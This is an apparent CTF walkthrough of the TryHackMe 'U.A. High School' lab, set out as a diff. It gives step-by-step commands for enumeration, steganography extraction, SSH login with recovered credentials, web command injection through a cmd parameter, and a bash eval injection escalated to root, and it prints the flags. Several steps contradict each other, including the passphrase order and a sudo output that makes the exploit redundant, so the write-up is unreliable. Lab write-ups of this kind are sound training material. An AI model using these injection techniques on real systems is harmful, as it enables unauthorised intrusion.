@@ -1,0 +1,231 @@
+
+1. Introduction
+
+This penetration testing assessment was conducted against the U.A. High School machine hosted on TryHackMe. The objective was to identify vulnerabilities, gain initial access, and escalate privileges to root in a controlled CTF environment.
+
+The assessment followed standard methodology:
+
+    Reconnaissance
+    Web enumeration
+    Exploitation
+    Data extraction (steganography + decoding)
+    Privilege escalation
+    Root flag capture
+
+2. Reconnaissance & Web Enumeration
+Port/Service Discovery
+
+Initial scanning revealed a web application hosted on:
+
+http://10.112.128.138
+
+Directory enumeration was performed using:
+
+dirsearch -u http://10.112.128.138
+
+Findings:
+
+/assets/
+/assets/images/
+/assets/index.php
+
+The /assets/images/ directory contained two image files:
+
+oneforall.jpg
+yuei.jpg
+
+3. Image Analysis & Recovery
+
+Files were downloaded for offline analysis:
+
+wget http://10.112.128.138/assets/images/oneforall.jpg
+wget http://10.112.128.138/assets/images/yuei.jpg
+
+File Issue Detected
+
+One image appeared corrupted:
+
+file oneforall.jpg
+
+Output:
+
+data (incorrect PNG/JPEG signature)
+
+Fixing Image (Magic Bytes Repair)
+
+Hex inspection:
+
+xxd oneforall.jpg | head
+
+Correct PNG header was identified:
+
+89 50 4E 47
+
+After correcting file structure, the image became readable.
+4. Steganography Extraction
+
+Using steghide:
+
+steghide extract -sf oneforall.jpg
+
+A passphrase was required.
+Password found from hidden content:
+
+AllmightForEver!!!
+
+Extracted file:
+
+creds.txt
+
+Contents:
+
+deku:One?For?All_!!one1/A
+
+5. Initial Access (SSH Login)
+
+Using extracted credentials:
+
+ssh deku@10.112.146.X
+
+Login successful.
+6. User Flag
+
+cat user.txt
+
+Output
+
+THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
+
+7. Web Command Injection Discovery
+
+The web endpoint was found vulnerable:
+
+http://10.112.128.138/assets/index.php?cmd=
+
+Example exploitation:
+
+curl "http://10.112.128.138/assets/index.php?cmd=ls"
+
+Result showed command execution on server.
+Write on Medium
+
+Reverse shell attempts confirmed RCE capability.
+8. Hidden Content Discovery
+
+Further enumeration:
+
+ls -la /var/www/html/assets/images
+
+Decoded base64 outputs revealed:
+
+/var/www/Hidden_Content
+
+Inside:
+
+passphrase.txt
+
+Extracted passphrase:
+
+curl http://.../passphrase.txt
+
+Decoded:
+
+AllmightForEver!!!
+
+(This was used for steghide earlier.)
+9. Privilege Escalation Path
+Sudo Permissions Check
+
+sudo -l
+
+Output:
+
+User deku may run:
+    (ALL) /opt/NewComponent/feedback.sh
+    (root) NOPASSWD: ALL
+
+This is a critical misconfiguration.
+10. Exploiting feedback.sh (Privilege Escalation)
+
+Script content:
+
+/opt/NewComponent/feedback.sh
+
+Key issue:
+
+eval "echo $feedback"
+
+This allows unsafe command evaluation.
+Exploitation
+
+Running:
+
+sudo /opt/NewComponent/feedback.sh
+
+Input:
+
+$BASH
+
+Output:
+
+/bin/bash
+
+This confirms command injection via eval.
+Direct Root Shell
+
+Since sudo allowed full privileges:
+
+sudo /bin/bash
+
+Result:
+
+root access gained
+
+11. Root Flag
+
+cat /root/root.txt
+
+Output:
+
+THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+
+12. Key Vulnerabilities Identified
+
+    Command Injection (index.php?cmd)
+    Unsafe eval() usage in Bash script
+    Sensitive file exposure in web directories
+    Weak privilege separation (NOPASSWD: ALL)
+    Information disclosure via steganography
+
+13. Conclusion
+
+The system was fully compromised through a combination of:
+
+    Web enumeration
+    Command injection
+    Hidden file extraction
+    Weak sudo configuration
+
+Final result: root access achieved successfully
+Tryhackme Writeup
+Cyber Security Machine
+Ctf Writeup
+Ctf Walkthrough
+Cybersecurity Training
+Anonymousd
+Written by Anonymousd
+﻿
+More from Anonymousd
+ContAInment: AI Security TryHackMe
+Anonymousd
+
+Anonymousd
+ContAInment: AI Security TryHackMe
+Can you help contain the ransomware threat with the help of AI?
+Apr 20
+Game Zone — TryHackMe: Walkthrough 🏴
+Anonymousd
+
+Anonymousd
+Game Zone — TryHackMe: Walkthrough 🏴
+L
